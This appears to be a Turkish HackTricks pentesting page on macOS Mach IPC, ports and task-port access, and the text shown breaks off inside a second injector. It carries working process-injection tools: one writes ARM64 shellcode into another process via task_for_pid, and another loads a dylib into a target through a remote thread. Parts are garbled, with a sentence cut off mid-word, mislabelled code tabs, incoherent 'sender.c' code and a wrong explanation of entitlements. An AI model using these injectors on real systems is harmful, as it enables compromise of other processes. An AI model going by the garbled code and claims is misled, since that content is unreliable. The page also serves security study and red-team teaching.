# macOS IPC - İşlem Arası İletişim

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Mach Mesajlaşması Portları Aracılığıyla

### Temel Bilgiler

Mach, kaynakları paylaşmak için **görevleri** en **küçük birim** olarak kullanır ve her görev **çoklu iş parçacıklarını** içerebilir. Bu **görevler ve iş parçacıkları POSIX işlemleri ve iş parçacıklarıyla 1:1 eşlenir**.

Görevler arasındaki iletişim, Mach İşlem Arası İletişim (IPC) kullanılarak gerçekleşir ve tek yönlü iletişim kanallarını kullanır. **Mesajlar, portlar arasında aktarılır** ve çekirdek tarafından yönetilen **mesaj kuyrukları gibi davranır**.

Her işlemde bir **IPC tablosu** bulunur ve bu tabloda işlemin **mach portları** bulunabilir. Bir mach portunun adı aslında bir sayıdır (çekirdek nesnesine bir işaretçi).

Bir işlem ayrıca, bazı haklarla birlikte bir port adını **farklı bir göreve gönderebilir** ve çekirdek bu girişi **diğer görevin IPC tablosunda** görünür hale getirir.

### Port Hakları

Bu iletişim için belirli bir görevin yapabileceği işlemleri tanımlayan port hakları önemlidir. Mümkün olan **port hakları** şunlardır ([buradan tanımlar alınmıştır](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Alma hakkı**, porta gönderilen mesajları almayı sağlar. Mach portları MPSC (çoklu üretici, tek tüketici) kuyruklarıdır, bu da sistemdeki her port için yalnızca **bir alma hakkı olabileceği** anlamına gelir (çoklu işlem, bir borunun okuma ucuna birden fazla işlem dosya tanımlayıcısı tutabilirken).
* **Alma hakkına sahip bir görev**, mesajları alabilir ve **Gönderme hakları oluşturabilir**, böylece mesaj gönderebilir. Başlangıçta yalnızca **kendi görevi, portunun üzerinde Alma hakkına sahiptir**.
* **Gönderme hakkı**, porta mesaj göndermeyi sağlar.
* Gönderme hakkı **kopyalanabilir**, böylece bir Gönderme hakkına sahip bir görev, hakkı kopyalayabilir ve **üçüncü bir göreve verebilir**.
* **Bir kez gönderme hakkı**, bir mesajı porta bir kez göndermeye ve ardından kaybolmaya olanak tanır.
* **Port kümesi hakkı**, tek bir porttan ziyade bir _port kümesini_ belirtir. Bir port kümesinden bir mesaj çıkarmak, içerdiği portlardan birinden bir mesaj çıkarır. Port kümeleri, Unix'teki `select`/`poll`/`epoll`/`kqueue` gibi birçok porta aynı anda dinlemek için kullanılabilir.
* **Ölü ad**, gerçek bir port hakkı değil, yalnızca bir yer tutucudur. Bir port yok edildiğinde, portun tüm mevcut port hakları ölü adlara dönüşür.

**Görevler, SEND haklarını başkalarına aktarabilir**, böylece onlara geri mesaj gönderebilirler. **SEND hakları da kopyalanabilir**, böylece bir görev, hakkı çoğaltabilir ve **üçüncü bir göreve verebilir**. Bu, aracı bir süreç olan **başlangıç sunucusu** ile görevler arasında etkili iletişimi sağlar.

### İletişim Kurma

#### Adımlar:

İletişim kanalını kurmak için **başlangıç sunucusu** (**mac**'de **launchd**) devreye girer.

1. Görev **A**, bir **yeni port** başlatarak işlemde bir **ALMA hakkı** elde eder.
2. ALMA hakkının sahibi olan Görev **A**, port için bir **GÖNDERME hakkı oluşturur**.
3. Görev **A**, **başlangıç sunucusu** ile bir **bağlantı** kurar ve **portun hizmet adını** ve **GÖNDERME hakkını** başlatma kaydı olarak bilinen bir prosedür aracılığıyla sağlar.
4. Görev **B**, hizmet adı için başlangıç sunucusuyla etkileşime girerek başlangıç **araması yapar**. Başarılı olursa, sunucu Görev A'dan aldığı **GÖNDERME hakkını kopyalar ve Görev B'ye iletir**.
5. GÖNDERME hakkını elde ettikten sonra, Görev **B**, bir **mesajı formüle edebilir** ve bunu Görev **A'ya gönderebilir**.
6. İki yönlü iletişim için genellikle Görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı olan yeni bir port oluşturur ve **GÖNDERME hakkını Görev A'ya verir**, böylece Görev A, Görev B'ye mesaj gönderebilir (iki yönlü iletişim).

Başlangıç sunucusu, bir görevin iddia ettiği hizmet adını **kimlik doğrulayamaz**. Bu, bir görevin potansiyel olarak herhangi bir sistem görevini taklit edebileceği anlamına gelir, örneğin yanlışlıkla bir yetkilendirme hizmet adı iddiasında bulunarak her isteği onaylayabilir.

Daha sonra, Apple, sistem tarafından sağlanan hizmetlerin adlarını, güvenli yapılandırma dosyalarında saklar. Bu dosyalar, **SIP korumalı** dizinlerde bulunur: `/System/Library/LaunchDaemons` ve `/System/Library/LaunchAgents`. Her hizmet adının yanında, **ilişkili ikili de saklanır**. Başlangıç sunucusu, bu hizmet adları için birer **ALMA hakkı oluşturur ve saklar**.

Bu önceden tanımlanmış hizmetler için, **arama süreci biraz farklıdır**. Bir hizmet adı arandığında, launchd hizmeti dinamik olarak başlatır. Yeni iş akışı aşağıdaki gibi gerçekleşir:

* Görev **B**, bir hizmet adı için başlangıç **araması başlatır**.
* **launchd**, görevin çalışıp çalışmadığını kontrol eder ve çalışmıyorsa, **başlatır**.
* Görev **A** (hizmet), bir başlangıç **kontrolü yapar**. Burada, başlangıç sunucusu bir GÖNDERME hakkı oluşturur, saklar ve ALMA hakkını Görev A'ya **aktarır**.
* launchd, **GÖNDERME hakkını kopyalar ve Görev B'ye gönderir**.
* Görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı olan yeni bir port oluşturur ve **GÖNDERME hakkını Görev
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
**Alma Hakkı**na sahip olan işlemler, bir Mach bağlantı noktasında mesaj alabilirler. Tersine, **gönderenler** bir _**gönderme**_ veya _**bir kez gönderme hakkı**_ verilir. Bir kez gönderme hakkı, yalnızca bir mesaj göndermek için kullanılır ve ardından geçersiz hale gelir.

Kolay bir **iki yönlü iletişim** sağlamak için bir işlem, _yanıt bağlantısı_ olarak adlandırılan bir Mach bağlantı noktasını mach **mesaj başlığı** içinde belirtebilir (**`msgh_local_port`**). Mesajın alıcısı, bu mesaja bir yanıt gönderebilir. **`msgh_bits`** içindeki bit bayrakları, bu bağlantı noktası için bir kez gönderme hakkının türetilip aktarılması gerektiğini **belirtmek** için kullanılabilir (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Unutmayın ki, bu tür iki yönlü iletişim, bir yanıt bekleyen XPC mesajlarında kullanılır (`xpc_connection_send_message_with_reply` ve `xpc_connection_send_message_with_reply_sync`). Ancak genellikle, önceki şekilde açıklandığı gibi farklı bağlantı noktaları oluşturulur ve iki yönlü iletişim sağlanır.
{% endhint %}

Mesaj başlığının diğer alanları şunlardır:

* `msgh_size`: tüm paketin boyutu.
* `msgh_remote_port`: bu mesajın gönderildiği bağlantı noktası.
* `msgh_voucher_port`: [mach kuponları](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: alıcı tarafından yorumlanan bu mesajın kimliği.

{% hint style="danger" %}
Mach mesajlarının, mach çekirdeğine yerleştirilmiş **tek alıcı**, **çoklu gönderen** iletişim kanalı olan bir **mach bağlantı noktası** üzerinden gönderildiğini **unutmayın**. **Birden çok işlem**, bir mach bağlantı noktasına **mesaj gönderebilir**, ancak herhangi bir anda yalnızca **bir işlem** onu okuyabilir.
{% endhint %}

### Bağlantı Noktalarını Sıralama
```bash
lsmp -p <pid>
```
Bu aracı iOS'a indirerek yükleyebilirsiniz. İndirmek için [http://newosxbook.com/tools/binpack64-256.tar.gz ](http://newosxbook.com/tools/binpack64-256.tar.gz) adresini kullanabilirsiniz.

### Kod örneği

Gönderenin, bir bağlantı noktası tahsis ettiğine, `org.darlinghq.example` adı için bir **gönderme hakkı** oluşturduğuna ve bunu **başlangıç sunucusuna** gönderdiğine dikkat edin. Alıcı ise bu isim için **gönderme hakkını** istedi ve bir mesaj göndermek için kullandı.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% tab title="sender.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/message.h>

int main(int argc, char *argv[]) {
    mach_port_t server_port;
    kern_return_t kr;
    char *message = "Hello, receiver!";
    mach_msg_header_t *msg;
    mach_msg_return_t mr;

    // Create a send right for the server port
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_SEND, &server_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] Failed to allocate send right for server port: %s\n", mach_error_string(kr));
        exit(1);
    }

    // Set the destination port
    server_port = 0x100; // Replace with the actual destination port

    // Allocate memory for the message
    msg = malloc(sizeof(mach_msg_header_t) + strlen(message) + 1);
    if (msg == NULL) {
        printf("[-] Failed to allocate memory for the message\n");
        exit(1);
    }

    // Set the message header
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->msgh_size = sizeof(mach_msg_header_t) + strlen(message) + 1;
    msg->msgh_remote_port = server_port;
    msg->msgh_local_port = MACH_PORT_NULL;
    msg->msgh_reserved = 0;

    // Copy the message content
    strcpy((char *)msg + sizeof(mach_msg_header_t), message);

    // Send the message
    mr = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (mr != MACH_MSG_SUCCESS) {
        printf("[-] Failed to send message: %s\n", mach_error_string(mr));
        exit(1);
    }

    printf("[+] Message sent successfully\n");

    return 0;
}
```

{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Ayrıcalıklı Portlar

* **Ana bilgisayar portu**: Bir işlem bu porta **Gönderme** ayrıcalığına sahipse, **sistem hakkında bilgi** alabilir (örneğin, `host_processor_info`).
* **Ana bilgisayar ayrıcalıklı portu**: Bu porta **Gönderme** hakkına sahip bir işlem, bir çekirdek uzantısı yükleme gibi **ayrıcalıklı eylemler** gerçekleştirebilir. Bu izne sahip olmak için **işlem kök kullanıcı** olmalıdır.
* Ayrıca, **`kext_request`** API'sini çağırmak için yalnızca Apple ikili dosyalarına verilen diğer yetkilendirmeler olan **`com.apple.private.kext*`**'e ihtiyaç vardır.
* **Görev adı portu**: _Görev portu_'nun ayrıcalıksız bir sürümüdür. Görevi referans alır, ancak kontrol etmeye izin vermez. Yalnızca `task_info()` üzerinden kullanılabilen tek şey gibi görünüyor.
* **Görev portu** (aka çekirdek portu)**:** Bu porta Gönderme izniyle görevi kontrol etmek mümkündür (bellek okuma/yazma, iş parçacığı oluşturma...).
* **Çağrıyı yapmak için** `mach_task_self()` **adını almak** için bu port için çağrıyı yaptığınız görev için. Bu port yalnızca **`exec()`** işlemi sırasında **miras alınır**; `fork()` ile oluşturulan yeni bir görev yeni bir görev portu alır (özel bir durum olarak, bir görev ayrıca `exec()`'den sonra bir suid ikili dosyada yeni bir görev portu alır). Bir görevi başlatmak ve portunu almak için yapılması gereken tek yol, bir `fork()` yaparken ["port takas dansını"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) gerçekleştirmektir.
* Bu, porta erişim için olan kısıtlamalardır (`AppleMobileFileIntegrity` ikili dosyasındaki `macos_task_policy`'den):
* Uygulamanın **`com.apple.security.get-task-allow` yetkilendirmesine** sahip olması durumunda, **aynı kullanıcıdan** gelen işlemler görev portuna erişebilir (genellikle hata ayıklama için Xcode tarafından eklenir). **Notarizasyon** süreci, bunun üretim sürümlerine izin vermez.
* **`com.apple.system-task-ports`** yetkilendirmesine sahip uygulamalar, çekirdek hariç, **herhangi bir** işlemin görev portunu alabilir. Daha eski sürümlerde **`task_for_pid-allow`** olarak adlandırılıyordu. Bu sadece Apple uygulamalarına verilir.
* **Kök**, **sertleştirilmiş** bir çalışma zamanıyla derlenmeyen (ve Apple'dan olmayan) uygulamaların görev portlarına erişebilir.

### Görev portu aracılığıyla İş Parçacığına Shellcode Enjeksiyonu&#x20;

Aşağıdaki bağlantıdan bir shellcode alabilirsiniz:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% tab title="entitlements.plist" %}

Bu dosya, bir macOS uygulamasının hangi özel yeteneklere sahip olduğunu belirlemek için kullanılır. Bu yetenekler, uygulamanın diğer işlemlerle iletişim kurmasına, sistem kaynaklarına erişmesine veya diğer güvenlik önlemlerini atlamasına izin verebilir. Entitlements.plist dosyası, uygulamanın gerekli yeteneklerini tanımlayan bir XML dosyasıdır.

Bu dosya, uygulamanın hangi IPC (Inter-Process Communication) yöntemlerini kullanabileceğini belirlemek için de kullanılabilir. IPC, farklı işlemler arasında iletişim kurmak için kullanılan bir mekanizmadır. Bu iletişim, mesajlaşma, paylaşılan bellek veya soketler gibi farklı yöntemlerle gerçekleştirilebilir.

Entitlements.plist dosyası, uygulamanın IPC yöntemlerini kullanabilmesi için gerekli yetenekleri içerebilir. Örneğin, uygulamanın diğer işlemlerle mesajlaşabilmesi için "com.apple.security.cs.allow-unsigned-executable-memory" yeteneği gerekebilir. Bu yetenek, uygulamanın paylaşılan bellek kullanarak diğer işlemlerle iletişim kurmasına izin verir.

Bu dosya, uygulamanın güvenlik ve ayrıcalık yükseltme saldırılarına karşı korunmasına yardımcı olmak için dikkatlice yapılandırılmalıdır. Uygulama geliştiricileri, yalnızca gerekli olan yetenekleri eklemeli ve gereksiz yetenekleri kaldırmalıdır. Aksi takdirde, uygulama, kötü niyetli kullanıcıların veya saldırganların hedefi olabilir ve sistem güvenliği tehlikeye girebilir.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Önceki programı **derleyin** ve aynı kullanıcıyla kod enjekte etmek için **yetkilendirmeleri** ekleyin (aksi takdirde **sudo** kullanmanız gerekecektir).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Task portu aracılığıyla Thread'e Dylib Enjeksiyonu

macOS'ta **thread'ler**, **Mach** veya **posix `pthread` api** kullanılarak manipüle edilebilir. Önceki enjeksiyonda oluşturduğumuz thread, Mach api kullanılarak oluşturulduğu için **posix uyumlu değildir**.

Bir komutu çalıştırmak için basit bir shellcode enjekte etmek mümkündü çünkü **posix uyumlu api'lerle çalışmak zorunda değildi**, sadece Mach ile çalışması gerekiyordu. **Daha karmaşık enjeksiyonlar** için thread'in de **posix uyumlu olması** gerekmektedir.

Bu nedenle, thread'i **geliştirmek için** **`pthread_create_from_mach_thread`** çağrılmalıdır, bu da geçerli bir pthread oluşturacaktır. Ardından, bu yeni pthread, sistemden bir dylib yüklemek için **dlopen** çağrısı yapabilir, böylece farklı işlemler gerçekleştirmek için yeni shellcode yazmak yerine özel kütüphaneler yüklenebilir.

Örnek dylib'leri aşağıda bulabilirsiniz (örneğin bir log oluşturan ve daha sonra dinleyebileceğiniz bir dylib):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
